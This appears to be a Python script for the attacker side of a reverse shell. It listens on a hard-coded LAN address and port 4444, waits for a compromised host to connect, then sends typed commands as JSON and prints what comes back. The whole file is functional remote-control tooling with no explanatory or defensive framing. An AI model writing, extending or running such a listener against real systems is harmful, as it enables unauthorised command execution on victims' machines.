#!/usr/bin/env python3
import socket
from termcolor import colored
import json 
import base64

def sendJSON(data):

    jsonData = json.dumps(data)
    jsonData = jsonData.encode()
    target.send(jsonData)

def receiveJSON():

    data = ''

    while True:

        try:
            
            command = target.recv(1024)
            command = command.decode('utf-8')
            data = data + command 
            return json.loads(data)

        except ValueError:
            continue

def shell():

    while True:

        command = input(colored('shell$ ', 'blue'))
        sendJSON(command)

        if command == 'exit':
            break

        elif command[:2] == 'cd' and len(command) > 1:

            continue
        
        else:
            result = receiveJSON().strip('\n')
            print(result)

def server():

    global sock
    global ip 
    global target

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    sock.bind(('192.168.52.39', 4444))
    sock.listen(5)

    print(colored('Listening for incoming connections...', 'yellow'))
    target, ip = sock.accept()
    print(colored('Connection Established from: %s' % str(ip), 'green'))

def main():
    
    server()
    shell()
    sock.close()

main()